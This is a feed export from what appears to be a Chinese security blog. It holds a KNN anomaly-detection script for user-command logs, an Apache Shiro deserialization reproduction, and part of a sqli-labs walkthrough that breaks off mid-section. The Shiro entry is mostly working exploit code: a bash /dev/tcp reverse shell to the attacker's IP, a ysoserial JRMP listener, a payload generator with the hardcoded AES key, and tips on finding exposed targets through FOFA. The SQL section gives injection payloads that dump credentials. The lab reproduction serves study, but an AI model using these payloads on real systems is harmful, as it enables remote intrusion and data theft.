title="python3完整代码如下"></a>python3完整代码如下</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> nltk.probability <span class="keyword">import</span> FreqDist  <span class="comment"># 统计命令出现频率</span></span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_user</span>(<span class="params">filename</span>):</span></span><br><span class="line">    most_cmd = []</span><br><span class="line">    mini_cmd = []</span><br><span class="line">    cmd_list = []</span><br><span class="line">    cmd_seq = []</span><br><span class="line">    <span class="comment"># 获取操作序列</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        cmd = f.readline()</span><br><span class="line">        temp = []</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(cmd):</span><br><span class="line">            cmd_list.append(cmd.strip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">            temp.append(cmd.strip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">            cnt = cnt + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(cnt == <span class="number">150</span>):  <span class="comment">#  这里不按照书上的分，我这里按照150个命令为一个序列，刚好和标签对上号，因为标签只有100个值</span></span><br><span class="line">                cmd_seq.append(temp)</span><br><span class="line">                cnt = <span class="number">0</span></span><br><span class="line">                temp = []</span><br><span class="line">            cmd = f.readline()</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 获取最频繁的前50个命令，获取最不频繁的前50个命令</span></span><br><span class="line">    fdist = <span class="built_in">sorted</span>(FreqDist(cmd_list).items(),key = operator.itemgetter(<span class="number">1</span>), reverse = <span class="literal">True</span>) <span class="comment"># 按照出现频率排序</span></span><br><span class="line">    most_cmd = [ item[<span class="number">0</span>] <span class="keyword">for</span> item <span class="keyword">in</span> fdist[:<span class="number">50</span>]]</span><br><span class="line">    mini_cmd = [ item[<span class="number">0</span>] <span class="keyword">for</span> item <span class="keyword">in</span> fdist[-<span class="number">50</span>:]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cmd_seq, most_cmd, mini_cmd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user_feature</span>(<span class="params">user_cmd_list, user_max_freq, user_min_freq</span>):</span></span><br><span class="line">    </span><br><span class="line">    user_feature = [] </span><br><span class="line">    <span class="keyword">for</span> cmd_list <span class="keyword">in</span> user_cmd_list:</span><br><span class="line">        <span class="comment"># 获取每个序列不重复命令的个数</span></span><br><span class="line">        seq_len = <span class="built_in">len</span>(<span class="built_in">set</span>(cmd_list))</span><br><span class="line">        <span class="comment"># 将每个序列按照出现频率由高到低的排列命令</span></span><br><span class="line">        fdist = <span class="built_in">sorted</span>(FreqDist(cmd_list).items(), key=operator.itemgetter(<span class="number">1</span>), reverse=<span class="literal">True</span>)</span><br><span class="line">        seq_freq = [item[<span class="number">0</span>] <span class="keyword">for</span> item <span class="keyword">in</span> fdist]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 获取最频繁和最不频繁的前10个命令</span></span><br><span class="line">        f2 = seq_freq[:<span class="number">10</span>]</span><br><span class="line">        f3 = seq_freq[-<span class="number">10</span>:]</span><br><span class="line">        <span class="comment"># 计算重合度</span></span><br><span class="line">        f2 = <span class="built_in">len</span>(<span class="built_in">set</span>(f2) &amp; <span class="built_in">set</span>(user_max_freq))</span><br><span class="line">        f3 = <span class="built_in">len</span>(<span class="built_in">set</span>(f3) &amp; <span class="built_in">set</span>(user_min_freq))</span><br><span class="line">        <span class="comment"># 合并特征：①每个序列不重复的命令个数；②每个序列最频繁的前10个命令和user中最频繁的50个命令重合度；③每个序列最不频繁的前10个命令和user中最不频繁的前50个命令重合度；</span></span><br><span class="line">        user_feature.append([seq_len, f2, f3])</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> user_feature</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_labels</span>(<span class="params">filename</span>):</span>  <span class="comment"># 获取第三列的标签</span></span><br><span class="line">    labels = []</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        temp = f.readline().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">while</span>(temp):</span><br><span class="line">            labels.append(<span class="built_in">int</span>(temp[<span class="number">4</span>])) </span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">            temp = f.readline().strip(<span class="string">&#x27;\n&#x27;</span>)    </span><br><span class="line">    <span class="keyword">return</span> labels</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    user_cmd_list, user_max_freq, user_min_freq = load_user(<span class="string">&#x27;user.txt&#x27;</span>)</span><br><span class="line">    user_feature = get_user_feature(user_cmd_list, user_max_freq, user_min_freq)</span><br><span class="line">    labels = get_labels(<span class="string">&#x27;labels.txt&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 切割数据集：训练集和测试集</span></span><br><span class="line">    x_train = user_feature[<span class="number">0</span>:<span class="number">70</span>]</span><br><span class="line">    y_train = labels[<span class="number">0</span>:<span class="number">70</span>]</span><br><span class="line">    </span><br><span class="line">    x_test = user_feature[<span class="number">70</span>:]</span><br><span class="line">    y_test = labels[<span class="number">70</span>:]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 训练数据</span></span><br><span class="line">    neight = KNeighborsClassifier(n_neighbors=<span class="number">3</span>)</span><br><span class="line">    neight.fit(x_train, y_train)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 预测</span></span><br><span class="line">    y_predict = neight.predict(x_test)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算得分</span></span><br><span class="line">    score = np.mean(y_test == y_predict) * <span class="number">100</span></span><br><span class="line">    print(score)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 90.0</span><br></pre></td></tr></table></figure><p>最终获得90%的正确率。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>①获取最频繁的前50个命令，书上的方式获取的并不是最频繁的前50个。在这里我改了下代码。②标签和数据对不上号，命令共有15000个，标签只有100个。书上的做法是每100个为一个操作序列，也就是有150个操作序列，然后在标签出再前面增加了50个标签。我的代码是将150个命令作为一个序列，这样下来刚好合适。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;sklearn之knn近邻算法&quot;&gt;&lt;a href=&quot;#sklearn之knn近邻算法&quot; class=&quot;headerlink&quot; title=&quot;sklearn之knn近邻算法&quot;&gt;&lt;/a&gt;sklearn之knn近邻算法&lt;/h1&gt;&lt;h2 id=&quot;近邻算法检测异常操作&quot;&gt;&lt;a href=&quot;#近邻算法检测异常操作&quot; class=&quot;headerlink&quot; title=&quot;近邻算法检测异常操作&quot;&gt;&lt;/a&gt;近邻算法检测异常操作&lt;/h2&gt;&lt;p&gt;数据来源:&lt;code&gt;http://www.schonlau.net/&lt;/code&gt;网页中的&lt;code&gt;Masquerading User Data&lt;/code&gt;。其中包含50个用户的操作日志，每个日志包含1500条操作命令，前面5000条是正常的操作，后面的10000条日志中随即包含有异常操作。具体参考《Web安全机器学习入门》&lt;/p&gt;</summary>
    
    
    
    
    <category term="机器学习" scheme="http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Apache Shiro 复现</title>
    <link href="http://example.com/2019/12/10/Apache-Shiro-%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2019/12/10/Apache-Shiro-%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-12-10T14:23:07.000Z</published>
    <updated>2020-01-10T15:52:33.069Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache-Shiro-反序列化漏洞"><a href="#Apache-Shiro-反序列化漏洞" class="headerlink" title="Apache Shiro 反序列化漏洞"></a>Apache Shiro 反序列化漏洞</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Apache Shiro 是ASF旗下的一款开源软件（Shiro发音为“shee-roh”，日语“堡垒（Castle）”的意思），提供了一个强大而灵活的安全框架。可为任何应用提供安全保障— 从命令行应用、移动应用到大型网络及企业应用。</p><p>Apache Shiro提供了认证、授权、加密和会话管理功能，将复杂的问题隐藏起来，提供清晰直观的API使开发者可以很轻松地开发自己的程序安全代码。并且在实现此目标时无须依赖第三方的框架、容器或服务，当然也能做到与这些环境的整合，使其在任何环境下都可拿来使用。</p><a id="more"></a><p>摘自：<a href="https://blog.csdn.net/peterwanghao/article/details/7997169">https://blog.csdn.net/peterwanghao/article/details/7997169</a> </p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache Shiro &lt;= 1.2.4 </p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul><li>一个Linux系统搭建 apache shiro</li><li>Ubuntu系统充当攻击机</li><li>一个Windows 10  (其实不要也行)</li></ul><h4 id="搭建-apache-shiro-环境"><a href="#搭建-apache-shiro-环境" class="headerlink" title="搭建 apache shiro 环境"></a>搭建 apache shiro 环境</h4><p>下载docker容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean&#x2F;vulapps:s_shiro_1</span><br></pre></td></tr></table></figure><p>运行docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:8080 medicean&#x2F;vulapps:s_shiro_1</span><br></pre></td></tr></table></figure><p>访问：<code>http://192.168.43.200:8080</code></p><p><img src="/images/1578668083087.png" alt="1578668083087"></p><h4 id="利用工具准备"><a href="#利用工具准备" class="headerlink" title="利用工具准备"></a>利用工具准备</h4><p>主要工具：yoserial.jar</p><p>先安装 <code>maven</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install maven</span><br></pre></td></tr></table></figure><p>下载及安装 yoserial：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial.git</span><br><span class="line"></span><br><span class="line">cd ysoserial&#x2F;</span><br><span class="line"></span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p>可一看下安装成功了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar</span><br></pre></td></tr></table></figure><p><img src="/images/1578667848813.png" alt="1578667848813"></p><p>将 <code>ysoserial-0.0.6-SNAPSHOT-all.jar</code> 重命名为 <code>ysoserial.jar</code>，因为后面要使用的 shiro.py 脚本中指定了 ysoserial.jar 名字调用，也可以修改脚本中的名称。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>Step 1：</strong>攻击机先监听 <code>666</code> 端口，用于接收到时候的反弹的 <code>shell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@unihac:~# nc -lvp 666</span><br></pre></td></tr></table></figure><p><img src="/images/1578668299618.png" alt="1578668299618"></p><p><strong>Step 2：</strong>将需要在目标机器上执行的反弹命令加密。</p><p>命令加密网址：<code>http://www.jackson-t.ca/runtime-exec-payloads.html </code></p><p>需要加密的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.43.146&#x2F;666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="/images/1578668499584.png" alt="1578668499584"></p><p><strong>Step 3：</strong> 用 yoserial.jar 监听一个端口 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@unihac:target# java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjE0Ni82NjYgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/1578668956099.png" alt="1578668956099"></p><p><strong>Step 4：</strong>利用shiro.py 向 java 发送生成poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro.py 192.168.43.146:6666</span><br></pre></td></tr></table></figure><p><img src="/images/1578669121185.png" alt="1578669121185"></p><p>注意：python 版本为2.7</p><p><strong>Step 5：</strong>先打开burpsuite，取消掉拦截，但要让流量经过burp。在Windows中访问 <code>http://192.168.43.200:8080</code> </p><p><img src="/images/1578669501752.png" alt="1578669501752"></p><p>在 history 中找到这样的请求包</p><p><img src="/images/1578669819559.png" alt="1578669819559"></p><p>将其发送到 Repeater 中</p><p><img src="/images/1578669884364.png" alt="1578669884364"></p><p>然后将我们在上一步获取到的 RememberMe 添加到 cookie 中。</p><p><img src="/images/1578669990601.png" alt="1578669990601"></p><p>发送出去。</p><p><strong>Step 6：</strong>大功告成</p><p>看下之前的 nc 监听的端口，可以看到已经返回了shell</p><p><img src="/images/1578670069778.png" alt="1578670069778"></p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p> Apache Shiro默认使用了<code>CookieRememberMeManager</code>，其处理cookie的流程是：得到<code>rememberMe的cookie值</code> &gt;  <code>Base64解码</code>–&gt;<code>AES解密</code>–&gt;<code>反序列化</code>。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。 <a href="https://www.secpulse.com/archives/112742.html">摘自</a></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>升级到最新版本</p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>使用网络空间搜索引擎，例如shadon、zoomeye、fofa等等进行扫描</p><p>使用fofa 搜索 title=”apache shiro *” 或者 app=”jeesite”，全是apache shiro的</p><p>例如：使用fofa 搜索app=”jeesite”</p><p><img src="/images/20200110235049.jpg"></p><p>借鉴：<a href="https://mp.weixin.qq.com/s/8F5tmbJsE0SshrYK-fRl-g">https://mp.weixin.qq.com/s/8F5tmbJsE0SshrYK-fRl-g</a></p><h3 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"> </span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])    </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Apache-Shiro-反序列化漏洞&quot;&gt;&lt;a href=&quot;#Apache-Shiro-反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;Apache Shiro 反序列化漏洞&quot;&gt;&lt;/a&gt;Apache Shiro 反序列化漏洞&lt;/h1&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;Apache Shiro 是ASF旗下的一款开源软件（Shiro发音为“shee-roh”，日语“堡垒（Castle）”的意思），提供了一个强大而灵活的安全框架。可为任何应用提供安全保障— 从命令行应用、移动应用到大型网络及企业应用。&lt;/p&gt;
&lt;p&gt;Apache Shiro提供了认证、授权、加密和会话管理功能，将复杂的问题隐藏起来，提供清晰直观的API使开发者可以很轻松地开发自己的程序安全代码。并且在实现此目标时无须依赖第三方的框架、容器或服务，当然也能做到与这些环境的整合，使其在任何环境下都可拿来使用。&lt;/p&gt;</summary>
    
    
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-labs通关</title>
    <link href="http://example.com/2019/12/10/sqli-labs/"/>
    <id>http://example.com/2019/12/10/sqli-labs/</id>
    <published>2019-12-10T14:23:07.000Z</published>
    <updated>2021-02-04T03:25:52.321Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs通关"><a href="#sqli-labs通关" class="headerlink" title="sqli-labs通关"></a>sqli-labs通关</h1><h2 id="Basic-Challenges-1-18关"><a href="#Basic-Challenges-1-18关" class="headerlink" title="Basic Challenges(1-18关)"></a>Basic Challenges(1-18关)</h2><a id="more"></a><h4 id="第一关：单引号报错注入"><a href="#第一关：单引号报错注入" class="headerlink" title="第一关：单引号报错注入"></a>第一关：单引号报错注入</h4><p>那就加一个单引号看看情况嘛</p><p><code>http://localhost/sqli-labs/Less-1/?id=1&#39;</code></p><p><img src="/images/1574949017025.png" alt="1574949017025"></p><p>那么流程直接往下走，没有任何过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 获取数据库名</span><br><span class="line">-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata -- +</span><br><span class="line"></span><br><span class="line"># 获取表名</span><br><span class="line">-1&#39;  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; -- +</span><br><span class="line"></span><br><span class="line"># 获取列名</span><br><span class="line">-1&#39;  union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; -- +</span><br><span class="line"></span><br><span class="line"># 获取数据</span><br><span class="line">-1&#39;  union select 1,2,group_concat(&quot;&#x2F;&quot;, username,&quot; : &quot;, password) from users -- +</span><br></pre></td></tr></table></figure><p><img src="/images/1574950705940.png" alt="1574950705940"></p><p>经验</p><ul><li><p>我发现在<code>-- +</code> 后面的+可以换成任何符号，都能实现注释。例如：<code>-- 0o0</code></p><p><img src="/images/1574950834260.png" alt="1574950834260"></p><p>但是，如果不加任何字符就会报错，如：</p><p><img src="/images/1574950925282.png" alt="1574950925282"></p></li><li><p>还有这里直接使用 <code>#</code> 不能实现注入，然后看了下后端代码没有任何处理，理论上不应该</p><p><img src="/images/1574950983819.png" alt="1574950983819"></p><p>为什么非要编码成 <code>%23</code></p><p><img src="/images/1574951027685.png" alt="1574951027685"></p><p>这里的原因也困扰了我好久，借用别人已经探究过的博客：<a href="https://bbs.pediy.com/thread-219378.htm">传送门</a></p><p><img src="/images/xm8zso5g.bmp" alt="xm8zso5g"></p></li></ul><h4 id="第二关：整形注入"><a href="#第二关：整形注入" class="headerlink" title="第二关：整形注入"></a>第二关：整形注入</h4><p>把所有注入语句中的 <code>id=1&#39;</code> 变成 <code>id=1</code> 后面其他字符串不变。即可</p><h4 id="第三关：单引号-括号"><a href="#第三关：单引号-括号" class="headerlink" title="第三关：单引号+括号"></a>第三关：单引号+括号</h4><p>尝试一下：<code>http://localhost/sqli-labs/Less-3/?id=1&#39;</code></p><p><img src="/images/1574952192338.png" alt="1574952192338"></p><p>那就闭合一下括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#39;) union select 1,2,group_concat(schema_name) from information_schema.schemata -- +</span><br></pre></td></tr></table></figure><p>步骤和上面一样</p><h4 id="第四关：双引号-括号"><a href="#第四关：双引号-括号" class="headerlink" title="第四关：双引号+括号"></a>第四关：双引号+括号</h4><p>访问：<code>http://localhost/sqli-labs/Less-4/?id=1&quot;</code></p><p><img src="/images/1574952393996.png" alt="1574952393996"></p><p>通过引号配对，看出多了个双引号和括号。直接构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&quot;) --+</span><br></pre></td></tr></table></figure><p>注入同上。</p><h4 id="第五关：报错注入-单引号"><a href="#第五关：报错注入-单引号" class="headerlink" title="第五关：报错注入(单引号)"></a>第五关：报错注入(单引号)</h4><p>访问网站：<code>http://localhost/sqli-labs/Less-5/?id=2&#39;</code></p><p>单引号报错</p><p><img src="/images/1575030156779.png" alt="1575030156779"></p><p>使用payload，并不会回显：<code>http://localhost/sqli-labs/Less-5/?id=2&#39; union select 1,2,3 -- +</code></p><p><img src="/images/1575030284425.png" alt="1575030284425"></p><p>但是它可以显示错误的sql语句信息，这时候就可以采用报错回显的方式进行注入。</p><p>报错注入方式：</p><ul><li><p>floor报错注入</p><p>替换其中的payload即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((payload),floor(rand(0)*2))x from information_schema.tables group by x)a)  </span><br><span class="line"></span><br><span class="line">如下,猜测数据库</span><br><span class="line">?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select concat(schema_name) from information_schema.schemata limit 5,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- +</span><br><span class="line"></span><br><span class="line">猜表名</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- +</span><br><span class="line"></span><br><span class="line">看着来吧，不写了。</span><br></pre></td></tr></table></figure></li><li><p>extractvalue 报错注入(能查询字符串的最大长度为32)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2&#39; and extractvalue(1, concat(0x5c, (payload))) -- +</span><br><span class="line"># payload 部分和上面完全一样</span><br></pre></td></tr></table></figure></li><li><p>updatexml (能查询字符串的最大长度为32)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2&#39; and 1&#x3D;(updatexml(1,concat(0x3a,(payload)),1)) -- +</span><br></pre></td></tr></table></figure></li><li><p>其他各种<strong>报错注入</strong>方式：<code>https://www.jianshu.com/p/bc35f8dd4f7c</code></p></li><li><p>这道题还可以用盲注</p></li></ul><h4 id="第六关：报错注入-双引号"><a href="#第六关：报错注入-双引号" class="headerlink" title="第六关：报错注入(双引号)"></a>第六关：报错注入(双引号)</h4><p>和上面类似，就只是把 <code>id=2&#39;</code> 改成 <code>id=2&quot;</code></p><h4 id="第七关：outfile方式读取"><a href="#第七关：outfile方式读取" class="headerlink" title="第七关：outfile方式读取"></a>第七关：outfile方式读取</h4><p>这个有点神奇哦，先要尝试各种报错，看看要不要闭合引号、括号之类的。我们输入下面这个payload，它不报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;2&quot; %23</span><br></pre></td></tr></table></figure><p><img src="/images/1575035354533.png" alt="1575035354533"></p><p>我的猜测是，他将 <code>&quot;#</code> 当成单引号里面的内容了，也就是在没遇到下一个单引号之前，所有的输入都会当成单引号里面的内容。看源码是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;2&quot; %23</span><br></pre></td></tr></table></figure><p>然后就闭合呗，因为这里不能使用回显注入，报错也不回显了。那就只能用盲注了。</p><p>一般上传webshell可以用这种方法，但是用这种方法来实现注入有点大材小用的感觉。满足条件：</p><ul><li>知道网站绝对路径</li><li>开启security_priv_file</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>访问文件即可。<strong>注意上面每次导出的时候，名字不能重复，会导致失败</strong></p><p><img src="/images/1575281363886.png" alt="1575281363886"></p><h4 id="第八关：布尔型注入"><a href="#第八关：布尔型注入" class="headerlink" title="第八关：布尔型注入"></a>第八关：布尔型注入</h4><p>没有回显，用 <code>id=1&#39; and 1=1 -- +</code> 和 <code>id=1&#39; and 1=0 -- +</code> 判断怎么闭合。如果前一个有显示，后一个没显示，那么就可以猜测后端需要通过闭合单引号实现注入。</p><p>接下来需要猜测数据库名字，这时候没有显示只能一个一个字母来进行猜测了。下面说下原理就行了，挨个挨个才比较麻烦，直接上sqlmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 第一个数据库的第一个字母 是否大于 a</span><br><span 